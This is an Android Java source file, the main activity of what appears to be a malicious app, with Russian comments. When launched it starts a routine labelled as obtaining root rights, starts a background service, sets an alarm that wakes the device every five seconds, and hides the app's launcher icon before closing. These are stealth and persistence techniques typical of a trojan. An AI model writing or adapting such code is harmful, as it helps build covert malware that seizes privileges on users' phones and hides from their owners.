package com.example.livemusay.myapplication;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //Запуск root прав
        goR0();

        //запуск нашего сервиса
       startService(new Intent(this, StartWhile.class));

        //пробуждаем устройсво через 5 секунд
      AlarmManager LO = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
       PendingIntent localPendingIntent = PendingIntent.getBroadcast(this, 0, new Intent(this, AlarM.class), 0);
      ((AlarmManager) LO).setRepeating(LO.RTC_WAKEUP, System.currentTimeMillis(), 5000, localPendingIntent);

        //скрываем иконку
       String pna = getApplicationContext().getPackageName();
        ComponentName CTD = new ComponentName(pna, pna + ".MainActivity");
        getPackageManager().setComponentEnabledSetting(CTD, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        //закрываем активити
       finish();
    }

    private void goR0()//функция root прав
    {
        Intent di = new Intent(MainActivity.this, goR00t.class);
        di.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(di);
    }
}
